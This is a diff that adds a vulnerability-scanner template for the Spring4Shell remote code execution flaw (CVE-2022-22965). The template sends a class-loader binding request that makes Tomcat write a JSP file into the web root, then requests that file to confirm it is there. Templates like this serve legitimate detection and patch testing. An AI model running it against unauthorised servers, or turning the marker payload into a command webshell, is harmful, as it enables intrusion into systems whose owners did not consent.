@@ -1,0 +1,56 @@
+id: cve-2022-22965
+info:
+  name: Spring Core Framework RCE (CVE-2022-22965)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Spring Core Framework Remote Code Execution vulnerability. This issue allows an unauthenticated attacker to execute arbitrary code on the server.
+  tags: rce, critical
+  classification:
+    cve-id: CVE-2022-22965
+  reference:
+    - https://spring.io/
+
+variables:
+  randomPrefix: '{{rand_base(5)}}'
+  randomInt: '{{rand_int(10000, 99999)}}'
+  payload: '{{url_encode("<% out.println(\"{{randomPrefix}}{{randomInt}}\"); %>")}}'
+
+http:
+  - id: initial-request
+    raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        class.module.classLoader.resources.context.parent.pipeline.first.pattern={{payload}}&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix={{randomPrefix}}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-webshell
+    raw:
+      - |
+        GET /{{randomPrefix}}{{randomInt}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '{{randomPrefix}}{{randomInt}}'
+        part: body
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: shell-url
+        part: header
+        regex:
+          - 'Location: (.*\.jsp)'
+        group: 1
